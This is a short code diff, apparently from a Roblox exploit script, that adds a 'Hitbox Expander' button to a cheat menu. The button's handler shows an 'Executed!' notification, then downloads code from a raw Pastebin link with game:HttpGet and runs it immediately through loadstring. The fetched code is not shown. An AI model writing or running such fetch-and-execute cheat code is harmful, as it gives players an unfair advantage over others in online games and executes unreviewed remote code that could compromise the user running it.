@@ -33,6 +33,13 @@ end)
 
 btns:Seperator()
 
+btns:Button("Hitbox Expander", function()
+    DiscordLib:Notification("Notification", "Executed!", "Okay!")
+    loadstring(game:HttpGet("https://pastebin.com/raw/R6ttafTG"))()
+end)
+
+btns:Seperator()
+
 btns:Label("The game must have collision on", true)
 
 
